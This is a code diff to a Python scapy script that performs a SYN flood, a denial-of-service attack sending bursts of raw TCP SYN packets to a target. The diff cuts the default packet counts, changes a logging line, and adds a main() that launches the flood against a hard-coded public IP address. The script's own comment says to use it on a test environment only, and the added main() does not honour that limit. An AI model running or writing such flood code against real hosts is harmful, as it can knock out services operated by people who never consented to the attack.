@@ -6,7 +6,7 @@ import datetime
 from scapy.layers.inet import IP, TCP
 
 
-def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100, log_file = "syns_results_p.txt"):
+def syn_flood(target_ip, target_port, packets_per_batch=10, batches=2, log_file = "syns_results_p.txt"):
     with open(log_file, "a") as log:
         log.write(f"\n\n--- SYN Flood Simulation Started at {time.time()} ---\n")
         total_packets_sent = 0
@@ -20,8 +20,7 @@ def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100, log_
             for _ in range(packets_per_batch):
                 send(ip/tcp, verbose=False)
                 total_packets_sent += 1
-                #txt.(total_packets_sent, time.time()-start_time \n)
-                log.write(f" SEQ = {total_packets_sent} TTL[{datetime.fromtimestamp(time.time()-start_time)}] \n")
+                log.write(f" SEQ = {total_packets_sent} TTL[{time.time() - start_time}] \n")
 
         end_time = time.time()
         total_time = end_time - start_time
@@ -32,3 +31,8 @@ def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100, log_
 
 # Example usage (USE ON TEST ENVIRONMENT ONLY)
 # syn_flood("192.168.1.100", 80)
+def main():
+    syn_flood("192.114.52.11", 40000)
+
+if __name__ == "__main__":
+    main()
